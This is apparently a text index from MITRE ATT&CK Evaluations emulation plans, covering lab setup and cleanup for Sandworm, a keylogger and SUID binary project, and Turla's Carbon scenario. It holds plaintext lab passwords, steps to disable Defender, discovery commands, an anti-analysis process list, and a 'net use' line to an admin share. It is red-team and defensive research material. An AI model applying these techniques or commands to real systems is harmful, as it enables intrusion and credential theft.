automatically restart services, select yes."]},{"i":"configure-caladan---10015","l":"Configure Caladan - 10.0.1.5","p":["Upload caladan.sh to 10.0.1.5 via SCP","Password:","Whg42WbhhCE17FEzrqeJ","â ï¸ Run this command if you get SSH key errors","Upload SUID binary to caladan","Run caladan.sh","Reboot caladan"]},{"i":"configure-gammu---10017","l":"Configure Gammu - 10.0.1.7","p":["RDP into Gammu:","Open Windows Defender, toggle all nobs to the off position.","Open PowerShell being sure to select \"Run as Administrator\":","Open Chromium and navigate to:","https://www.stealmylogin.com/demo.html","Enter the following credentails; save / cache the credentials when prompted.","Double check the credentials were cached by going to Chromium settings > passwords. You should have one entry for stealmylogin.com.","Reboot gammu:"]},{"i":"configure-arrakis---10014","l":"Configure arrakis - 10.0.1.4","p":["RDP into arrakis:","Open Windows Defender, toggle all nobs to the off position.","Open PowerShell being sure to select \"Run as Administrator\":","Reboot"]},{"i":"configure-quadra---10018","l":"Configure quadra - 10.0.1.8","p":["RDP into quadra:","Open Windows Defender, toggle all nobs to the off position.","Open PowerShell being sure to select \"Run as Administrator\":","Reboot"]}],[{"l":"Sandworm Scenario Cleanup Procedure"},{"l":"Caladan","p":["Upload Caladan cleanup script:","Password:","Whg42WbhhCE17FEzrqeJ","Run the Caladan cleanup script:","â ï¸ if you see this error, just reboot Caladan and re-run the cleanup procedure.","shred: /var/www/html/centreon_module_linux_app64: failed to open for writing: Text file busy","Reboot Caladan"]},{"i":"arrakis---10014","l":"Arrakis - 10.0.1.4","p":["RDP into Arrakis as follows:","Open PowerShell being sure to select \"Run as Administrator\":","Cleanup Quadra / 10.0.1.8","Enter creds when prompted:","ebqMB7DmM81QVUqpf7XI","Reboot arrakis and quadra"]},{"i":"gammu---10017","l":"Gammu - 10.0.1.7","p":["RDP into Gammu as follows:","Open PowerShell being sure to select \"Run as Administrator\":","Reboot gammu"]}],[{"l":"SetWindowsHookEx-Keylogger","p":["Windows C++ Native Keylogger using SetWindowsHookEx"]},{"l":"Usage","p":["The project solution can be compiled with the following commands (make file provided, compiles with g++)","To run the executable in the background you can execute the binary in the background as follows"]},{"l":"Notes","p":["Modifications to this project include:","Write to file functionality (partially there with ofstream)","Change solution configuration, and project structure","Add BAT file to start the executable with START /B SetWindowsHookEx-Keylogger.exe -o keylogger_output.txt"]},{"l":"References","p":["Project based on: https://github.com/killswitch-GUI/SetWindowsHookEx-Keylogger/","CTI Reference: https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/"]}],[{"l":"SUID Binary","p":["suid-binary is used to model the following TTP in the SandWorm scenario:"]},{"l":"Quick Start"},{"l":"Build Instructions","p":["Use the 'make' utility as follows:"]},{"l":"Test Instructions","p":["Test suid-binary with Python:"]},{"l":"Usage Examples"},{"l":"Cleanup Instructions","p":["Just delete suid-binary from disk:"]},{"l":"CTI Evidence","p":["https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"]}],[{"i":"adversary-overview","l":"Adversary Overview \uD83C\uDFDCï¸ \uD83E\uDEB1","p":["Sandworm Team 1 is a destructive threat group attributed to Russia's General Staff of the Armed Forces, Main Intelligence Directorate (GRU) that has been reportedly active since 2009. 2 3 In 2015 Sandworm used a BlackEnergy variant and the KillDisk module against three Ukrainian power distribution companies causing a power outage during the Christmas holidays. The outage left over 225,000 Ukrainian citizens without power in the middle of winter. 4 Sandworm is known for conducting large scale, well funded, destructive, and aggressive campaigns such as Olympic Destroyer, CrashOverride/Industroyer, and NotPetya. 5 6 7 8 NotPetya, a destructive worm-like wiper malware disguised as ransomware, resulted in a global infection that caused nearly $1 billion in losses to three victim organizations alone. 2 9 The \"Sandworm\" name was derived from references to the novel Dune found throughout the malware code, initially used to attribute other pieces of malware to the adversary. 10","Associated Names: ELECTRUM, Telebots, IRON VIKING, BlackEnergy (Group), Quedagh, VOODOO BEAR"]},{"i":"group-overview-report-references","l":"Group Overview Report References \uD83D\uDD17","p":["1","10","2","3","4","5","6","7","8","9","http://blog.talosintelligence.com/2018/02/olympic-destroyer.html","https://blogs.vmware.com/security/2017/06/carbon-black-threat-research-technical-analysis-petya-notpetya-ransomware.html","https://securelist.com/expetrpetyanotpetya-is-a-wiper-not-ransomware/78902/","https://www.cisa.gov/uscert/ics/alerts/IR-ALERT-H-16-056-01","https://www.digitalshadows.com/blog-and-research/mapping-mitre-attck-to-sandworm-apts-global-campaign/#:~:text=SandWorm%20is%20an%20APT%20group,aggressive%20and%20sometimes%20destructive%20cyberattacks.","https://www.dragos.com/wp-content/uploads/CrashOverride-01.pdf","https://www.justice.gov/opa/pr/six-russian-gru-officers-charged-connection-worldwide-deployment-destructive-malware-and","https://www.justice.gov/opa/press-release/file/1328521/download","https://www.mandiant.com/resources/ukraine-and-sandworm-team","ID","Report Links"]},{"i":"connect-with-us","l":"Connect with us \uD83D\uDDE8ï¸","p":["We \uD83D\uDC96 feedback! Let us know how using ATT&CK Evaluation results has helped you and what we can do better.","Email: evals@mitre-engenuity.org Twitter: https://twitter.com/MITREengenuity LinkedIn: https://www.linkedin.com/company/mitre-engenuity/"]}],[{"i":"#","p":["Based on open-source intelligence, the ATT&CK Â® Evaluations team created the below scenario leveraging techniques seen from Sandworm in the wild. We have adapted the scenario based on tools and resources available at the time. Below is a diagram, scenario overview, step-by-step breakdown, and an infrastructure diagram.","Software Flow Diagram"]},{"l":"Emulation Scenario","p":["\uD83D\uDCD6 In our scenario, a group of developers from the Holtzman organization decided to use an open-source tool called Weirdingway to monitor their development pipeline by pass budget constraints. Years pass and the Weirdingway software became baked into the developerâs environment. Some time later, Sandworm identified a vulnerability in a specific version of the Weirdingway project that exposes a webpage to the open internet. Sandworm began searching for this exposed webpage and identified the Holtzman organization as running the Weirdingway software with the vulnerable version.","Exploiting the vulnerability (due to enviornment limitiations we use SSH and deploy the P.A.S. Webshell emulation), Sandworm establishes persistence with a P.A.S. webshell v3.1.4. After conducting initial discovery, Sandworm downloads the Linux/Exaramel software, modifies the permissions, and executes gaining C2 communications. Exaramel installs two persistence mechanisms (cron & systemd) then exfiltrates the /etc/shadow, bash history, and SSH keys. Performing offline password cracking, Sandworm obtains credentials for Frank Herbert on the Gammu host.","Sandworm uploads Exaramel to the Gammu host using smbclient with valid credentials collected from the offline password cracking on the previous host, Caladan. Using a bind shell with psexec, persistence is established via registry keys and credential collection tools. The legitimate user Frank Herbert, fherbert, logs in to their computer via RDP and goes about their workday. Sandworm collects Frankâs credentials with keylogging deployed as a part of their OraDump Credential Collection toolkit. Sandworm conducts local host and network discovery, specifically looking for open RDP sessions.","Using credentials from an active RDP session on Gammu, Sandworm RDPs into the Arrakis host as Paul Atreides, patreides. After additional discovery, the Arrakis host is determined the ideal location to deploy NotPetya. NotPetya is uploaded to the Active Directory and executed. NotPetya creates a scheduled task, searches for connected devices, dumps credentials, copies itself to discovered hosts, and executes itself. While moving laterally, NotPetya searches for files with specific file extensions, encrypts the files, clears windows event logs and executes the scheduled task to reboot."]},{"l":"Scenario Steps","p":["\uD83D\uDC63 Steps start at 11 to follow emulation procedures","After additional discovery, the Arrakis host is determined the ideal location to deploy NotPetya. When executed, NotPetya creates a scheduled task, searches for connected devices, dumps credentials, copies itself to discovered hosts, and executes itself on the new host. Simultaiously, NotPetya searches for files with specific file extensions, encrypts the files, drops a ransom note, clears Window's event logs and executes the scheduled task to reboot.","Exaramel installs two persistence mechanisms (cron & systemd) then exfiltrates the /etc/shadow, bash history, and SSH keys. Performing offline password cracking, Sandworm obtains credentials for Frank Herbert on the Gammu host.","Exploit","https://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html https://securelist.com/be2-custom-plugins-router-abuse-and-target-profiles/67353/ https://blog.talosintelligence.com/2018/02/olympic-destroyer.html https://www.welivesecurity.com/2017/07/04/analysis-of-telebots-cunning-backdoor/","https://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html https://www.us-cert.gov/ncas/alerts/TA17-181A https://www.justice.gov/opa/press-release/file/1328521/download","https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf","https://www.justice.gov/opa/press-release/file/1328521/download","https://www.justice.gov/opa/press-release/file/1328521/download https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/ https://www.welivesecurity.com/2017/07/04/analysis-of-telebots-cunning-backdoor/","https://www.justice.gov/opa/press-release/file/1328521/download https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/ https://www.welivesecurity.com/2018/10/11/new-telebots-backdoor-linking-industroyer-notpetya/","https://www.justice.gov/opa/press-release/file/1328521/download https://www.welivesecurity.com/2017/07/04/analysis-of-telebots-cunning-backdoor/","https://www.us-cert.gov/ics/alerts/IR-ALERT-H-16-056-01 https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf","https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/ https://www.welivesecurity.com/2017/06/30/telebots-back-supply-chain-attacks-against-ukraine/","https://www.welivesecurity.com/2018/10/11/new-telebots-backdoor-linking-industroyer-notpetya/ https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf","Linux\\Exaramel","Not in Play Step 00","NotPetya","oradump/LaZagne variant (CredRaptor & Plainpwd) Win64.Spy.KeyLogger.G","P.A.S. webshell","P.A.S. webshell Linux\\Exaramel","RDP NotPetya","Report Links","Sandworm conducts local host and network discovery, specifically looking for open RDP sessions.","Sandworm downloads the Linux\\Exaramel ELF executable via the webshell, modifies the file permissions, then executes Linux\\Exaramel. Linux\\Exaramel establishes connection to the C2.","Sandworm downloads two files associated with credential harvesting tools to the Gammu host. Once executed, Sandworm obtains domain admin credentials from an active RDP session. Sandworm then enumerates all domain hosts using dsquery.","Sandworm enumerates information about the compromised system by issuing shell commands through the PHP webshell.â Executed commands include whoami, uname, ls, etc.","Sandworm identifies a vulnerability in an open source tool, Weirdingway. When deployed with the default configurations, a webpage is exposed to the open internet. Analyst Comment: Due to environment limitations for using exploits, operators use SSH to access the host and deploy the PAS webshell","Sandworm logs into the Caladan host via SSH and deploys a PHP webshell as persistence.â","Software","Step 11","Step 12","Step 13","Step 14","Step 15","Step 16","Step 17","Step 18","Step 19","Steps","User Story","Using credentials from the active RDP session on Gammu, Sandworm RDPs into the Arrakis host as Paul Atreides, patreides. Sandworm uploads NotPetya to Arrakis over a network share tunneled through the RDP connection.","Using Frank Herbert's credentials, obtained from the previous step, Sandworm uploads Windows/Exaramel to the Gammu host using the smbclient. Persistence is established using registry keys and Windows/Exaramel is executed upon Frankâs login to the Gammu host.","Windows/Exaramel","Windows/Exaramel PsExec"]},{"l":"Infrastructure Diagram"}],[{"l":"Turla","p":["License","Based on open-source intelligence, the MITRE ATT&CK Â® Evaluations team created the below scenario leveraging techniques seen from Turla in the wild. We have adapted the scenario based on tools and resources available at the time."]},{"i":"adversary-overview","l":"Adversary Overview â¾ï¸\uD83E\uDEA8\uD83E\uDDF8","p":["Active since at least the early 2000s, Turla is a sophisticated Russian-based threat group that has infected victims in more than 50 countries. 1 The group has targeted government agencies, diplomatic missions, military groups, research and education facilities, critical infrastructure sectors, and media organizations. 1 2 Turla leverages novel techniques and custom tooling and open-source tools to elude defenses and persist on target networks. 3 4 The group is also known for its adaptability and willingness to evolve behaviors and tools to achieve campaign objectives. 5 6 7 Turla is known for their targeted intrusions and innovative stealth. After establishing a foothold and conducting victim enumeration, Turla persists with a minimal footprint through in-memory or kernel implants. 8 9 Turla executes highly targeted campaigns aimed at exfiltrating sensitive information from Linux and Windows infrastructure. 10 11","Associated Groups: IRON HUNTER, Group 88, Belugasturgeon, Waterbug, WhiteBear, Snake, Krypton, Venomous Bear"]},{"i":"emulation-overview","l":"Emulation Overview \uD83D\uDCD6","p":["This scenario follows Turlaâs multi-phase intelligence collection campaign by establishing a typo-squatted website of NATO to target entities with a high value of information. During phase one, Turla implants a watering hole for persistence on the victimâs network as a way to compromise more targets of interest. Turla gains initial access through a spearphishing email, a fake software installer is downloaded onto the victim machine, and execution of the EPIC payload takes place. Once persistence and C2 communications are established, a domain controller is discovered, and CARBON-DLL is ingressed into victim network. Further lateral movement brings the attackers to a Linux Apache server where PENGUIN is copied to the server and used to install a watering hole.","In phase two of the attack, the attackers establish a typo-squatted website to target entities with high value information. The victims are prompted to update their (Not)Flash, and in doing so, EPIC is installed on their network. EPIC communicates to the C2 server via proxy web server with HTTPS requests, and SNAKE is then deployed to maintain foothold, elevate privileges and communicates to the C2 via HTTP/SMTP/DNS. Next, the attackers move laterally onto a Microsoft IIS server, install SNAKE, and create an admin account. The attackers then move laterally onto an Exchange workstation, and install SNAKE. Fianlly, they move laterally onto an Exchange Server and install LightNeuron. LIGHTNERON enables email collection and staging for exfiltrating stolen data via benign email PDF/JPG attachments. Turla proceeeds to collect and exfiltrate sensitive communications in an effort to identify new information sources and collect up-to-date information relevant to mission objectives.","Carbon Operations Flow Diagram Snake Operations Flow Diagram"]},{"l":"Quick Links"},{"i":"for-engineers","l":"For Engineers \uD83E\uDDD1â\uD83D\uDCBB"},{"l":"Resources","p":["The Resources Folder contains the emulated software source code.","The Binaries.zip contains scenario payloads in one zip file for easy download. The password is malware.","NOTE: The Snake installer has not been included in this zip and must be recompiled.","All other pre-built executables have been removed. To rebuild the binaries, follow the documentation for the respective binary.","This scenario also utilizes Mimikatz, Plink, Pscp, and PsExec as payloads:","mimikatz","plink.exe","pscp.exe","PsExec"]},{"l":"YARA Rules","p":["YARA rules are provided to assist the community in researching, preventing, and detecting malware specimens used in this emulation plan."]},{"i":"emulation-key-software","l":"Emulation Key Software \uD83D\uDCBB","p":["EPIC","Carbon","Keylogger","Penquin","Snake","LightNeuron"]},{"l":"Scenario Walkthrough","p":["Carbon Detection Scenario- Step by step walkthrough of Carbon Detection Scenario's procedures (10 steps)","Snake Detection Scenario- Step by step walkthrough of Snake Scenario's procedures (9 steps)","Carbon Protection Scenario- Step by step walkthrough of Carbon Protection Scenario's procedures (7 tests)","Snake Protection Scenario- Step by step walkthrough of Snake Protection Scenario's procedures (6 tests)"]},{"i":"for-analysts","l":"For Analysts \uD83D\uDD0E","p":["Carbon Operation Flow- High-level summary of the Carbon scenario & infrastructure with diagrams.","Snake Operation Flow- High-level summary of the Snake scenario & infrastructure with diagrams.","Intelligence Summary- General overview of the Adversary with links to reporting used throughout the scenario."]},{"l":"Acknowledgements","p":["We would like to formally thank the people that contributed to the content, review, and format of this document. This includes the MITRE ATT&CK and MITRE ATT&CK Evaluations teams, the organizations and people that provided public intelligence and resources, as well as the following organizations that participated in the community cyber threat intelligence contribution process: - Microsoft - CrowdStrike"]},{"i":"connect-with-us","l":"Connect with us \uD83D\uDDE8ï¸","p":["We \uD83D\uDC96 feedback! Let us know how using ATT&CK Evaluation results has helped you and what we can do better.","Email: evals@mitre-engenuity.org Twitter: https://twitter.com/MITREengenuity LinkedIn: https://www.linkedin.com/company/mitre-engenuity/"]},{"i":"liability--responsible-usage","l":"Liability / Responsible Usage","p":["This content is only to be used with appropriate prior, explicit authorization for the purposes of assessing security posture and/or research."]},{"l":"Notice","p":["Â© 2023 MITRE Engenuity. Approved for Public Release. Document number CT0005.","Licensed under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at","http://www.apache.org/licenses/LICENSE-2.0","Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.","This project makes use of ATT&CKÂ®","ATT&CK Terms of Use"]}],[{"i":"carbon-emulation-scenario","l":"Carbon Emulation Scenario \uD83D\uDCD6","p":["Based on open-source intelligence, the ATT&CK Â® Evaluations team created the below scenario leveraging techniques seen from Turla in the wild. We have adapted the scenario based on tools and resources available at the time. Below is a scenario overview, step-by-step breakdown, and an infrastructure diagram."]},{"l":"Overview","p":["This scenario follows Turlaâs multi-phase approach to implant a watering hole as a way to compromise more victims of interest. Turla gains initial access through a spearphishing email, a fake software installer is downloaded onto the victim machine and execution of the EPIC payload takes place. Once persistence and C2 communications are established, a domain controller is discovered, and CARBON-DLL is ingress into victim network. Further lateral movement takes the attackers to a Linux Apache server, PENGUIN is copied to the server and used to install a watering hole.","Phase 1: The scenario begins when the user Gunter visiting a typosquat domain via a spearphishing email. When the link is opened, a fake software installer is downloaded on Gunterâs Windows host machine. Gunter clicks âInstall,â executing the malicious EPIC payload. EPIC establishes persistence and connects to a C2 server via a proxy web server using HTTP requests. The attackerâs enumeration on Gunterâs device, discovers a domain controller on the network and the domain admin Frieda.","Phase 2: To maintain persistence, the attackers will deploy CARBON-DLL and prepare to laterally move onto the domain controller. The use of password spraying helps to obtain Friedaâs domain admin credentials. Friedaâs credentials are then used to mount the DCâs hard drive, move a copy of CARBON-DLL to this drive, and execute the malware on the DC via remote scheduled task. A Linux Apache Server and the serverâs admin Adalwolfa is discovered during enumeration. CARBON-DLL downloads Mimikatz and dumps Adalwolfaâs stored NTLM hash. Mimikatz and Adalwolfaâs NTLM hash are used to perform a pass-the-hash (PtH) attack allowing the attackers to authenticate into Adalwolfaâs device and copy CARBON-DLL to the workstation via PsExec.","Phase 3: On Adalwolfaâs workstation, a custom keylogger is dropped and captures plaintext SSH credentials. CARBON-DLL downloads the PENQUIN malware to Adalwolfaâs workstation, the SSH credentials allows the attackers to copy PENQUIN to the Apache server and execute the malware via plink. PENQUIN is utilized to install a watering hole causing users browsing a legitimate HTML site to be redirected to the malicious, attacker-controlled site.","Carbon Operations Flow Diagram","Carbon Software Flow Diagram"]},{"i":"scenario-steps","l":"Scenario Steps\uD83D\uDC63","p":["About PENQUINx64: the malware can also download remote files in chunks (1024 bytes each) to a local vile via the âdo_vsdownloadâ function. This particular method will not work for the scenario since all âdo_vsâ functions are executed on remote IPs distinct from the C2 (a.k.a. a third peer). CTI deviation: Based on available reporting, PENQUINx64 has not been used in watering hole attacks. However, Turla has used other tools/payloads to launch watering hole attacks to fingerprint victims for initial access purposes. This scenario uses the installation of watering holes to transition into the SNAKE scenario (second scenario). Watering hole details: 1. User visits the compromised webpage hosting malicious Javascript. 2. On the userâs first visit, the browser adds and evercookie which has an MD5 value provided by the web server. The evercookie will keep track of which users have already visited the site. 3. On a userâs second visit, the stored MD5 value is used to identify the victim and the attackers will collect OS info which is sent to the C2 through POST requests.","After obtaining the NTLM hash for user Adalwolfa, the attackers will move laterally to this userâs workstation. In order to do this, the threat actor will leverage the CARBON-DLL implant on the domain controller to download PsExec and another copy of the CARBON-DLL installer. To perform the lateral movement, CARBON-DLL performs a pass-the-hash (PtH) attack to move the installer onto Adalwolfaâs device. Finally, the attackers use PsExec to execute CARBON-DLL remotely on Adalwolfaâs Windows workstation.","Analyst Notes","C2 Comms Details: Internal: P2P, use of named pipes, worker drones received tasks via named pipes External: use of HTTP requests, communication drones contacted C2s directly","CARBON-DLL","CARBON-DLL Keylogger: winsvcxgt.exe","CARBON-DLL Mimikatz","CARBON: ipconfig -all netstat -r netstat -an nbtstat -n nbtstat -s net share net file net session net use net group net view net config system info net time \\\\127.0.0.1","Commands","CTI deviation: SSH was not utilized in Turlaâs PENQUINx64 campaign, but has been used in other Turla attacks PENQUINx64 variant: - Written in C/C++- 64-bit architectures - Defense evasion: embeds legitimate Linux binary to mimic cron Old versions of PENQUIN:- ELF 32-bit LSB exe - Intel 80386 version 1 (SYSV) - GNU/Linux 2.2.5 (stripped) - Does not require admin/root privileges to run - Requires 2 parameters: ID & existing network interface name Essentially, there are commands that are integrated into PENQUINx64âs code. Each command code corresponds to a specific function which the malware then executes. A full list of these functions is listed on page 13 of the Leonardo Spa report.","CTI deviation: we simplified the delivery of EPIC for feasibility purposes. According to CTI, Turla previously delivered EPIC using Adobe exploits (CVE-2013-3346 & CVE-2013-5065) or watering hole attacks.","EPIC","EPIC discovery commands: arp -a net use ipconfig/all net localgroup administrators net group Doman Admins /domain net group Domain Computers /domain net group Domain Controllers /domain tasklist /svc reg query","EPIC will terminate itself upon discovering any of the following processes: tcpdump.exe windump.exe ethereal.exe wireshark.exe ettercap.exe snoop.exe dsniff.exe","EPIC will then be injected via DLL onto Gunterâs workstation. The implant will perform initial discovery commands, enumerating information about the user, host device, network, system, registry, directory, and running processes. EPIC will send this data to the C2 via a proxy web server using HTTP requests. This web server, which was initially used to download the Adobe Flash installer, hosts a fake WordPress-related domain.","https://securelist.com/the-epic-turla-operation/65545/ https://blog.talosintelligence.com/2021/09/tinyturla.html https://www.leonardo.com/documents/15646808/16757471/Malware+Technical+Insight+_Turla+%E2%80%9CPenquin_x64%E2%80%9D.pdf/524e39d0-029f-1a99-08d5-c013be1b8717?t=1590739252338 https://securelist.com/the-penquin-turla-2/67962/","https://securelist.com/the-epic-turla-operation/65545/ https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=4501a782-fd84-4f44-a231-ee2a3e838c39CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68tab=librarydocuments","https://securelist.com/the-epic-turla-operation/65545/ https://go.recordedfuture.com/hubfs/reports/cta-2020-0312.pdf https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf","https://securelist.com/the-epic-turla-operation/65545/ https://go.recordedfuture.com/hubfs/reports/cta-2020-0312.pdf https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html https://recon.cx/2018/brussels/resources/slides/RECON-BRX-2018-Visiting-The-Snake-Nest.pdf","https://securelist.com/the-epic-turla-operation/65545/ https://www.leonardo.com/documents/15646808/16757471/Malware+Technical+Insight+_Turla+%E2%80%9CPenquin_x64%E2%80%9D.pdf/524e39d0-029f-1a99-08d5-c013be1b8717?t=1590739252338 https://securelist.com/the-penquin-turla-2/67962/ https://lab52.io/blog/looking-for-penquins-in-the-wild/ https://www.welivesecurity.com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/ https://github.com/samyk/evercookie","https://securelist.com/the-epic-turla-operation/65545/ https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html https://blog.talosintelligence.com/2021/09/tinyturla.html","https://securelist.com/the-epic-turla-operation/65545/ https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/ https://www.accenture.com/us-en/blogs/cyber-defense/turla-belugasturgeon-compromises-government-entity https://www.gdatasoftware.com/blog/2015/01/23926-analysis-of-project-cobra","https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html(pp. 21) https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/waterbug-espionage-governments","https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html(pp. 21) https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/waterbug-espionage-governments https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/","In order to maintain a foothold on the Apache web server, the adversary will utilize PENQUIN to install a watering hole. Specifically, the attackers send a magic packet to the Apache server, which is read by PENQUIN. This causes the creation of a reverse shell, which will perform discovery commands. Then, the attackers append additional script tags to a webpage previously accessed by Adalwolfa on the Apache server. This will allow users browsing the legitimate site http://kagarov/index[.]html to be redirected to the malicious, attacker-controlled site anto-int[.]com.","Mimikatz PsExec","net use EPIC has moved through the victimâs network using pre-defined passwords: net use \\\\NET-DC-01\\C$ P@ssw0rd /user:MOFA\\Administrator","Next, the attackers download Mimikatz ( mmgaproxy.exe) to the DC and the attackers retrieve NTLM hash for admin user Adalwolfa.","Next, the attackers will deploy CARBON-DLL as a second-stage malware onto Gunterâs workstation in order to maintain persistence. CARBON-DLL, a variant of CARBON relying on DLLs and asymmetric encryption, will establish C2 communications via a redirector using HTTP requests. Once this communication channel is created, the malware will run a few discovery commands on Gunterâs device and drop several files to disk. CARBON-DLL has the following components and functions: Installer- create subdirectories for staging, create services, and executes loader Loader- written to a registry key path, runs under svchost and executes orchestrator Orchestrator- injects communications library DLL into processes via HTTP","Once C2 communications have been established between EPIC and the C2 via the proxy web server, the attackers will collect information about the host device, including: -Local/privileged groups -System services -System/Process discovery At this point, the adversary will discover 2 crucial aspects on the network: -Domain controller -Domain admin accounts, including user Frieda In order to escalate privileges, EPIC restarts itself as local system admin on Gunterâs workstation.","Once the adversary has moved onto Adalwolfaâs computer, CARBON-DLL downloads a custom keylogger ( winsvcxgt.exe). This tool allows the adversary to retrieve Adalwolfaâs plaintext SSH credentials during the userâs Chrome browser session.","Password spraying: CTI shows that EPIC has been used to conduct password spraying (see Report 1 for details)","PENQUINx64","PENQUINx64 plink","Reporting","Software","Step 1 Initial Compromise T1566.002: Phishing: Spearphishing Link T1204.002: User Execution: Malicious File T1036.004: Masquerading: Masquerade Task or Service T1574.007: Hijack Execution Flow: Path Interception by Path Environment Variable T1547.004: Boot Logon Autostart Execution: Winlogon Helper DLL","Step 10 Installation of Watering Hole T1205: Traffic Signaling T1132.001: Data Encoding: Standard Encoding T1059.004: Command and Scripting Interpreter: Unix Shell T1033: System Owner/User Discovery T1083: File and Directory Discovery T1189: Drive-by Compromise","Step 2 Establish Initial Access T1027: Files or Information T1055.007: Injection: Dynamic-link Library Injection T1057: Discovery T1059.003: and Scripting Interpreter: Windows Command Shell T1087.001: Account Discovery: Local Account T1012: Query Registry T1082: Information Discovery T1124: System Time Discovery T1057: Process Discovery T1135: Network Share Discovery T1049: System Network Connections Discovery T1069.001: Permission Groups Discovery: Local Groups T1033: System Owner/User Discovery T1083: File and Directory Discovery T1560.002: Archive Collected Data: Archive via Library T1132.001: Data Encoding: Standard Encoding T1071.001: Application Layer Protocol: Web Protocols T1090.002: Proxy: External Proxy","Step 3 Discovery & Privilege Escalation T1033: System Owner/User Discovery T1007: System Service Discovery T1124: System Time Discovery T1049: System Network Connections Discovery T1135: Network Share Discovery T1016: System Network Configuration Discovery T1069.001: Permission Groups Discovery: Local Groups T1069.002: Permission Groups Discovery: Domain Groups T1012: Query Registry T1059.001: Command and Scripting Interpreter: PowerShell T1574.011: Hijack Execution Flow: Services Registry Permissions Weakness","Step 4 Persistence T1105: Ingress Tool Transfer T1543.003: Create or Modify System Process: Windows Service T1112: Modify Registry T1569.002: System Services: Service Execution T1036.004: Masquerade Task or Service T1055.007: Injection: Dynamic-link Library Injection T1033: System Owner/User Discovery T1049: System Network Connections Discovery T1071.001: Application Layer Protocol: Web Protocols T1573.002: Encrypted Channel: Asymmetric Cryptography T1573.001: Encrypted Channel: Symmetric Cryptography T1132.001: Data Encoding: Standard Encoding T1074.001: Data Staged: Local Data Staging","Step 5 Lateral Movement to Domain Controller T1105: Ingress Tool Transfer T1059.003: Command and Scripting Interpreter: Windows Command Shell T1110.003: Brute Force: Password Spraying T1021.002: Remote Services: SMB/Windows Admin Shares T1070.004: Indicator Removal on Host: File Deletion T1570: Lateral Tool Transfer T1053.005: Scheduled Task/Job: Scheduled Task T1071: Application Layer Protocol T1069.002: Permission Groups Discovery: Domain Groups T1018: Remote System Discovery","Step 6 Preparation for Lateral Movement onto Second Host T1105: Ingress Tool Transfer T1003.004: Credential Dumping: LSA Secrets T1550.002: Alternate Authentication Material: Pass the Hash","Step 7 Lateral Movement to Second Workstation T1105: Tool Transfer T1550.002: Use Alternate Authentication Material: Pass the Hash T1070.004: Indicator Removal on Host: File Deletion","Step 8 Credential Access on Admin Host[T1105https://attack.mitre.org/techniques/T1105/ Ingress Tool Transfer T1056.001: Input Capture: Keylogging T1059.001: Command and Scripting Interpreter: PowerShell T1021.004: Remote Services: SSH T1489: Service Stop T1041: Exfiltration over C2 Channel T1070.004: Indicator Removal on Host: File Deletion","Step 9 Lateral Movement to Linux Server T1105: Ingress Tool Transfer T1021.004: Remote Services: SSH T1053.003: Scheduled Task/Job: Cron T1078.002: Valid Accounts: Domain Accounts T1070.004: Indicator Removal on Host: File Deletion T1027: Obfuscated Files or Information T1222.002: File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification T1036.005: Masquerading: Match Legitimate Name or Location T1543: Create or Modify System Process T1205: Traffic Signaling T1040: Network Sniffing","Steps & Techniques","To begin the lateral movement onto the targeted Linux Apache server, CARBON-DLL downloads PENQUIN to Adalwolfaâs workstation. Using the stolen credentials previously retrieve by the keylogger, the attackers copy PENQUIN to the Apache server. PENQUIN will mimic the legitimate Linux cron utility and modify the service. Finally, plink will be downloaded and copied to execute PENQUIN on the Apache server.","User Gunter (non-admin) receives a spearphishing email from noreply@sktlocal[.]it with a malicious link, http://www.anto-int.com. Believing the link to be a valid NATO-related site, Gunter clicks the link and is tricked into installing what appears to be a legitimate software installer. The malicious installer ( NtFlashVersion.exe) drops EPIC onto Gunterâs Windows workstation.","User Story","Using the enumerated usernames, the adversary conducts password spraying. This process retrieves Friedaâs admin credentials to the local domain controller. To laterally move onto the DC, the attackers will use Friedaâs stolen password to mount the DCâs C:\\ drive, and downloads and moves a second copy of the CARBON-DLL installer to this drive. The implant will be executed via remote scheduled task and then establish communications with the C2 server by leveraging P2P with the first CARBON-DLL implant Gunterâs device out to the redirector. While performing discovery on the DC, the adversary discovers the following network devices: 1. Remote Apache web server 2. Windows workstation for user Adalwolfa (admin on Apache server)","WordPress domain: CTI shows Turla has utilized compromised legitimate WordPress sites and WordPress-focused URLs for C2 purposes (e.g., 